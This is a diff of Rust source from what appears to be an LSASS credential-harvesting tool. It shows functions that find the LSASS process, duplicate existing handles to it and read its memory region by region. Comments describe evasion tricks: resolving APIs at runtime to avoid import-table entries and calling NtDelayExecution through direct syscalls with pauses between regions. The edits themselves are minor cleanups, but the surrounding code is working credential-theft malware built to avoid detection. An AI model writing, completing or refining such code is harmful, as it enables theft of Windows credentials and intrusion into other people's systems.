@@ -947,7 +947,7 @@ fn revert_privileges(ctx: &PrivilegeContext) {
 fn find_lsass_pid() -> Result<u32> {
     // First call to determine buffer size.
     let mut return_length: u32 = 0;
-    let status = unsafe {
+    let _status = unsafe {
         nt_query_system_information(
             SYSTEM_PROCESS_INFORMATION,
             ptr::null_mut(),
@@ -1080,7 +1080,7 @@ fn acquire_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
 /// Attempt to find and duplicate an existing handle to LSASS from another process.
 fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
     let mut return_length: u32 = 0;
-    let status = unsafe {
+    let _status = unsafe {
         nt_query_system_information(
             SYSTEM_HANDLE_INFORMATION,
             ptr::null_mut(),
@@ -1168,7 +1168,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
         match dup_result {
             Ok(dup_handle) => {
                 // Verify this handle points to LSASS by querying its PID.
-                let mut pid: u32 = 0;
+                let _pid: u32 = 0;
                 // Resolve GetProcessId at runtime to avoid IAT entry.
                 let get_pid: Option<unsafe extern "system" fn(winapi::um::winnt::HANDLE) -> u32> =
                     (|| unsafe {
@@ -1681,8 +1681,8 @@ pub fn harvest_lsass() -> Result<String> {
         // Sleep between regions via NtDelayExecution (no IAT entry).
         unsafe {
             let delay = std::time::Duration::from_millis(INTER_REGION_SLEEP_MS as u64);
-            let mut li = -(delay.as_nanos() as i64) / 100; // negative = relative, in 100ns units
-            let li_bytes = std::mem::transmute::<i64, [u8; 8]>(li);
+            let li = -(delay.as_nanos() as i64) / 100; // negative = relative, in 100ns units
+            let li_bytes = i64::to_ne_bytes(li);
             let _ = crate::syscall!(
                 "NtDelayExecution",
                 0u64,           // Alertable = FALSE
